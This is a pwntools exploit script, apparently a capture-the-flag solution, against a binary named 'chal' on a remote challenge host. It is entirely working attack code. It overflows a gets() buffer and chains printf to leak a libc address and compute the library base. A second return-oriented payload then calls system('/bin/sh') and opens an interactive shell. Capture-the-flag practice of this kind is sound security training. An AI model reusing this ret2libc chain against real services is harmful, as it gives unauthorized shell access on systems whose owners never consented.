from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("challenge.secso.cc", 8004)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


bss = 0x404000
main = 0x401156
ret = 0x0000000040119B
pop_rbp = 0x000000000040113d
print_rbp_8 = 0x40116D

print_plt = elf.plt["printf"]
gets_plt = elf.plt["gets"]

payload = b"tinyfattinyfat"
payload = payload.ljust(0x28, b"\x00")
payload += p64(ret)
payload += p64(gets_plt)
payload += p64(gets_plt)
payload += p64(print_plt)
payload += p64(main)

io.sendlineafter("your name: \n", payload)

io.sendline(b"a" * 8 + p64(0))
pause()
io.sendline("bbbb")

io.recvuntil("`aa")
leak = u64(io.recv(6).ljust(8, b"\x00"))
log.success("leak :-----> " + hex(leak))
libc.address = leak + 0x28c0

system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
ret = next(libc.search(asm("ret")))
environ = libc.symbols["__environ"]

ddebug("break *0x40119a\n continue")
payload = b"a" * 0x28
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendlineafter("your name: \n", payload)

io.interactive()
